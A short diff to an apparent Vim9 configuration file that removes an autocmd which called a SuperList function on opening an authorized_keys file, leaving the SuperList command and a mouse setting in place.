@@ -268,7 +268,6 @@ def g:SuperList(): void
         g:super_list_enabled = 1
     endif
 enddef
-autocmd BufReadPost authorized_keys :call g:SuperList()
 command SuperList call g:SuperList()
 
 set mouse=a
